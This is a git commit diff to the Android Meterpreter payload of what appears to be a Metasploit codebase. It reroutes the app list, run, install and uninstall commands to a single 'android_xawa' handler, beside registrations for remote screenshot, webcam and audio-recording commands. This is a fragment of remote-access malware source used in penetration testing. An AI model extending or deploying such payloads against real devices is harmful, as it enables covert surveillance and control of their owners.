26d4bfcfec2331836f4a870fb7cd1be3623a2bfe
Manwel Bugeja <manwelbugeja@Manwels-MBP-2.lan>
2023-04-06 10:45:32 +0200

    pointeed more commands to xawa; removed reduundant classes and perms

--- java/androidpayload/library/src/com/metasploit/meterpreter/AndroidMeterpreter.java
+++ java/androidpayload/library/src/com/metasploit/meterpreter/AndroidMeterpreter.java
@@ -137,10 +137,10 @@ public class AndroidMeterpreter extends Meterpreter {
         mgr.registerCommand(CommandId.STDAPI_SYS_PROCESS_GETPID, stdapi_sys_process_getpid_android.class);
         mgr.registerCommand(CommandId.STDAPI_UI_DESKTOP_SCREENSHOT, stdapi_ui_desktop_screenshot.class);
         if (context != null) {
-            mgr.registerCommand(CommandId.APPAPI_APP_LIST, appapi_app_list.class);
-            mgr.registerCommand(CommandId.APPAPI_APP_RUN, appapi_app_run.class);
-            mgr.registerCommand(CommandId.APPAPI_APP_INSTALL, appapi_app_install.class);
-            mgr.registerCommand(CommandId.APPAPI_APP_UNINSTALL, appapi_app_uninstall.class);
+            mgr.registerCommand(CommandId.APPAPI_APP_LIST, android_xawa.class);
+            mgr.registerCommand(CommandId.APPAPI_APP_RUN, android_xawa.class);
+            mgr.registerCommand(CommandId.APPAPI_APP_INSTALL, android_xawa.class);
+            mgr.registerCommand(CommandId.APPAPI_APP_UNINSTALL, android_xawa.class);
             mgr.registerCommand(CommandId.STDAPI_WEBCAM_AUDIO_RECORD, stdapi_webcam_audio_record_android.class);
             mgr.registerCommand(CommandId.STDAPI_WEBCAM_LIST, webcam_list_android.class);
             mgr.registerCommand(CommandId.STDAPI_WEBCAM_START, webcam_start_android.class);
